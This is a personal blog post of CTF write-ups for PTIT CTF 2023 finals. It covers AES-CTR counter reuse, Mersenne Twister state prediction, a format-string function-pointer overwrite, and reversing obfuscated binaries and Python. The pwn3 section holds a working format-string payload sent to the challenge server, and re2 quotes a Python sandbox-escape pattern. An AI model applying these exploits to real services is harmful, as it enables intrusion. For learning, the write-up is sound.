---
title: "PTIT CTF 2023 Finals: writeups"
image:
  path: /assets/img/covers/ctf-ptit-ctf-2023-finals.webp
  alt: "PTIT CTF 2023 Finals writeups"
date: 2023-11-05 10:00:00 +0700
categories: ["CTF Writeups", "PTIT CTF 2023 Finals"]
tags: [ctf, writeup, crypto, pwn, rev]
render_with_liquid: false
---

These are my writeups for the finals round of PTIT CTF 2023, a Vietnamese university CTF hosted by PTIT. I worked on three Crypto challenges (crypto1 to crypto3), one Pwn challenge (pwn3), and three Reverse Engineering challenges (re1 to re3).

## Crypto - crypto1

No challenge files were kept for this one, only the flag.

Flag: `PTITCTF{n3fq44jbke2yihc70x8e}`

## Crypto - crypto2

The challenge source, `crypto1.py`, encrypts two messages with AES in CTR mode, reusing the same key and the same counter object for both calls.

```python
from Crypto.Cipher import AES
from Crypto.Util import Counter
from Crypto import Random

flag = open("flag.txt", "rb").read()
nonce = Random.get_random_bytes(8)
countf = Counter.new(64, nonce)
key = Random.get_random_bytes(32)

encrypto = AES.new(key, AES.MODE_CTR, counter=countf)
encrypted = encrypto.encrypt(b"TODO:\n - ADD HARDER CHALLENGE IN CRYPTO\n - ADD FLAG TO THE CHALLENGE\n")

encrypto = AES.new(key, AES.MODE_CTR, counter=countf)
encrypted2 = encrypto.encrypt(flag)

print(f"encrypted: {encrypted}")
print(f"encrypted2: {encrypted2}")
```

Both `AES.new` calls reuse the `countf` counter object, so the keystream bytes for the plaintext and for the flag are identical. Since the plaintext (the TODO text) is fully known, the keystream can be recovered from it and XORed into the flag ciphertext:

`flag = known_plaintext XOR enc_plaintext XOR enc_flag`

```python
from pwn import *
enc_flag =  b'\xa9\xdc\xf7\xe0\xfd\xd3\x86\xef\xb5\xe4]&\x84\xaf_],\xd7mf\xc2M\x03M\xdc\xad\xa0_sP&O\x08\xf4\xa7,\xfb\x8aht\xb3\xfa\xfa0\x15n\xe8\xa2W\xb9YK\xc3=q|\xb6\xa7HaP\x08`\xddL\xb9\xb5\xcd\xfe'
enc_input =  b'\xad\xc7\xfa\xfb\x84\x8d\xe0\xb9\xfd\xd1m\x12\xd7\xdd1 \x1f\xe5Hh\xf8j7u\xe5\x8a\x8b6U\x1f\x02._\xd6\x81\x16\xc3\xe1QC\xe1\xaf\x98\x028|\xa0\xaf)\xb9i\x16'

input = b"TODO:\n - ADD HARDER CHALLENGE IN CRYPTO\n - ADD FLAG TO THE CHALLENGE\n"

flag = xor(input, enc_input, enc_flag)
log.success(f'{flag=}')
```

Running this against the two ciphertexts in `out.txt` gives the flag directly.

Flag: `PTITCTF{https://www.youtube.com/watch?v=rxBsiVhK2Aw}`

## Crypto - crypto3

The server, `server.py`, uses Python's `random` module (Mersenne Twister, MT19937) as if it were a secure stream cipher: it either hands out raw 32 bit outputs of `random.getrandbits(32)`, or encrypts each character of the flag by adding a fresh `getrandbits(32)` output to its ord value.

```python
import random

flag = open("flag.txt", "r").read().strip()
for i in range(666):
    choice = input(
        "1.Get random number\n2.Get flag encrypted\nYour choice:").strip()
    if (choice == '1'):
        random_value = random.getrandbits(32)
        print(random_value)
    elif choice == '2':
        enc = []
        for char in flag:
            enc.append(ord(char) + random.getrandbits(32))
        print(enc)
```

MT19937 is not cryptographically secure. After observing 624 consecutive 32 bit outputs, the internal state of the generator can be reconstructed and every future output predicted. The intended solve queries option 1 exactly 624 times, feeds the values into an MT19937 state-recovery predictor, then queries option 2 and subtracts the predicted keystream from each encrypted value to get back `ord(c)`:

```python
from pwn import *
from mt19937predictor import MT19937Predictor

predictor = MT19937Predictor()
r = remote("159.223.44.154", 8989)
for i in range(624):
    r.recvuntil(b"Your choice:")
    r.sendline(b"1")
    predictor.setrandbits(int(r.recvline().decode().strip()), 32)
r.recvuntil(b"Your choice:")
r.sendline(b"2")
enc = eval(r.recvline().decode().strip())
flag = ""
for i in enc:
    flag += chr(i - predictor.getrandbits(32))
print(flag)
```

The server is offline now, but `output.txt` kept from the original run only contains raw option-2 style outputs (no accompanying 624 raw `getrandbits` samples), so the saved transcript does not carry enough state to run the standard predictor offline. Given only that transcript, the flag can still be recovered by brute forcing the two unknown MT19937 outputs per character position with the known `PTITCTF{` prefix and `}` suffix, then checking each guess against the official MT19937 recurrence relation (`y[i+397] = y[i+624] XOR (upper bit of y[i], lower 31 bits of y[i+1] mixed) XOR matrix constant`) across the repeated keystream cycle.

Flag: `PTITCTF{n0w_y0u_kn0wn_mt19937pr3djct0r_43f3924f9f09}`

## Pwn - pwn3

The binary is a small, not-stripped x86-64 ELF with a `vuln` function and a `win` function. Disassembling `vuln`:

```
40132a:	push   rbp
401332:	sub    rsp,0x30
401345:	lea    rax,[rip+...]        # 4012f6 <lose>
40134c:	mov    QWORD PTR [rip+0x2d3d],rax   # 404090 <func>
401353:	lea    rax,[rip+...]        # format string
401362:	call   printf@plt
401367:	lea    rax,[rbp-0x30]
40137d:	call   read@plt
401386:	mov    rdi, rax
40138e:	call   printf@plt           # printf(buf) - user input used as format string
401393:	mov    rdx, QWORD PTR [rip+0x2cf6]   # func
40139f:	call   rdx
```

The global function pointer `func` (at address `0x404090`) is initialized to point at a `lose` function. The program then reads attacker-controlled input into a stack buffer and passes it straight to `printf` as the format string, a classic uncontrolled format string bug. Right after, the program calls through `func`. If the format string can be used to overwrite `func` so it points at `win` (`0x401310`) instead of `lose` (`0x4012f6`), the call lands on `win`.

Since `win` and `lose` share the same upper address bytes (`0x40....`), only the low 16 bits of the pointer at `0x404090` need to change, from `0x12f6` to `0x1310` (4880 in decimal). The classic `%<n>c%<argnum>$hn` format string primitive writes a 2 byte short to an address taken from a chosen stack argument, after first padding output to exactly `n` characters (which becomes the value written, modulo 65536). The address of `func` is placed on the stack right after the format string so it lands at the 8th format argument:

```python
from pwn import *

p = remote("159.223.44.154", 13339)
payload = b"%4880c%8$hnaaaaa" + p64(0x404090)
p.sendline(payload)
p.interactive()
```

`%4880c` pads the printf output to 4880 characters, then `%8$hn` writes that count (4880 = 0x1310) as a 2 byte short to the address given by the 8th format argument, which is `0x404090`, the `func` pointer. This redirects the pointer from `lose` to `win`, which presumably prints the flag on the next call.

Status: unsolved. The challenge server is no longer reachable, and no recorded output or flag was kept from the original run. The format string primitive and the exact payload are confirmed by static analysis of the binary, but the flag string itself was never saved locally.

## Rev - re1

A small ELF that `check`s a hardcoded, encoded array of DWORDs against a `decode` function applied to each byte of the user's input. The disassembly of `decode`:

```
0x11d1 <decode+8>:   mov    eax,edi
0x11d3 <decode+10>:  mov    BYTE PTR [rbp-0x4],al
0x11d6 <decode+13>:  movsx  eax,BYTE PTR [rbp-0x4]
0x11da <decode+17>:  shl    eax,0x18
0x11dd <decode+20>:  or     eax,0x495350
```

So each expected input byte, after being shifted left by 24 bits and OR-ed with the constant `0x495350`, must match one of the 37 stored DWORDs (`0x50495350`, `0x54495350`, and so on, taken straight from `check`'s stack writes). To recover the flag, the operation is simply undone: OR the stored constant back in (a no-op since the low bytes already carry it) and shift right by 24 to isolate the original byte.

```python
from Crypto.Util.number import *

fl = [
    0x50495350, 0x54495350, 0x49495350, 0x54495350,
    0x43495350, 0x54495350, 0x46495350, 0x7b495350,
    0x74495350, 0x6b495350, 0x33495350, 0x5f495350,
    0x34495350, 0x73495350, 0x73495350, 0x33495350,
    0x6d495350, 0x62495350, 0x6c495350, 0x79495350,
    0x5f495350, 0x66495350, 0x30495350, 0x72495350,
    0x5f495350, 0x62495350, 0x33495350, 0x71495350,
    0x6a495350, 0x6e495350, 0x6e495350, 0x33495350,
    0x72495350, 0x5f495350, 0x72495350, 0x33495350,
    0x7d495350
]

for i in range(len(fl)):
    fl[i] = (fl[i] | 0x495350) >> 24

print(b"".join(long_to_bytes(x) for x in fl))
```

Flag: `PTITCTF{tk3_4ss3mbly_f0r_b3qjnn3r_r3}`

## Rev - re2

This challenge is a Python script that obfuscates itself heavily, using the classic `()`.__class__.__base__.__subclasses__() sandbox-escape trick to reach `__builtins__` at runtime and reconstructing string literals from hex-encoded bytes. Underneath that noise, the real check is a sequence of statements of the form `inp[i]**k == N`, meaning each byte of the input, raised to some power `k`, equals a fixed number `N`.

`solveok.py` strips off the obfuscation layer by regex-matching and replacing the sandbox-escape pattern with the actual decoded bytes, then extracts every `inp[i]**k == N` constraint with another regex and solves for `inp[i]` by taking the integer `k`-th root of `N`:

```python
import re
import warnings
from gmpy2 import iroot
from random import *

x = open("decompilee.py").read()

g = re.findall(r"(\[n for n in \(\)\.__class__\.__base__\.__subclasses__\(\) if \"rni\" in n\.__name__ and n\.__name__ == n\.__name__\.lower\(\)\]\[0\]\(\)\._module\.__builtins__\.__getitem__\(\".+?\"\),\"(.+?)\"\).decode\(\))",x)
for i in g:
    exec(f"w=bytes.fromhex(\"{i[1]}\")")
    x = x.replace(i[0],f"{w}")

g = re.findall(r"__getitem__\(b'globals'\)\(\)\.__getitem__\(b'inp'\)\.__getitem__\((\d+?\^\d+?)\)\.__pow__\((\d+?)\)\.__eq__\((\d+?)\)",x)
inp = bytearray([1]*51)
for i in g:
    inp[eval(i[0])]=int(iroot(eval(i[2]),eval(i[1]))[0])
print(inp.decode())
```

That recovers the raw input bytes that satisfy the power checks, but the challenge applies two more transformation stages on top before producing the final flag. Stage 2 appends a short prefix generated from a seeded Brainfuck-derived string and then shifts each input byte up by a small per-position random increment (seeded, so deterministic). Stage 1 then XORs each resulting byte with its index and reverses the whole string:

```python
def stage2(b):
    seed(10)
    t = "++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>++.++++++.-----------.++++++."[-15:(7*9)].strip('-')
    for q in range(0,len(b)):
        t += chr(ord(b[q])+randint(0,5))
    return t

def stage1(a):
    a = list(a)
    for o in range(len(a)):
        a[o] = chr(ord(a[o])^o)
    a.reverse()
    z = "".join(x for x in a)
    return z

print(stage1(stage2(inp.decode())))
```

Running `solveok.py` end to end (recover the power-check bytes, then forward through `stage2` and `stage1`, since the script already applies both stages to its own reconstructed input) prints the flag directly.

Flag: `PTITCTF{pYthOn_obFuScAtION_iS_N0_M4TCH_f0r_U_H3h3!}`

## Rev - re3

A larger (~200 KB), stripped-of-symbols Windows PE32 executable named `RE_Hard.pdb` internally, with essentially no readable strings beyond the PE loader stub and a Winsock error string, suggesting it talks over a socket and does its checking without any helpful plaintext.

Status: unsolved. Static inspection (`file`, `strings`, `objdump -d`) did not turn up an exported `main`, meaningful symbol names, or an embedded flag format, and no solve script was kept for this challenge. Properly reversing it would need a real disassembler session (IDA/Ghidra) with time to trace the custom check logic, which is out of scope for a static command-line pass.
